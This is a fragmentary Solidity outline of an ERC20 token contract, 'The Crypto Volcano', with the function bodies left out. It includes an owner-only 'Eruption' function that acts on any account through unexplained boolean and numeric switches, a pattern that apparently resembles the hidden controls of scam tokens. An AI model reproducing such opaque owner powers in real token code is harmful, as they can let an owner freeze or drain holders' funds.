...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _launchTheToken(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function Eruption(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Buyback is Context, ERC20 {
    constructor(
        ...
        _launchTheToken(owner, initialSupply, tmp6, tmp7);
    }
}

contract TheCryptoVolcano is ERC20Buyback {
    constructor() ERC20Buyback("The Crypto Volcano", "VOLCAN", false, true, 1000, 30, msg.sender, 200000000 * 10 ** 18, msg.sender, 5) {
    }
}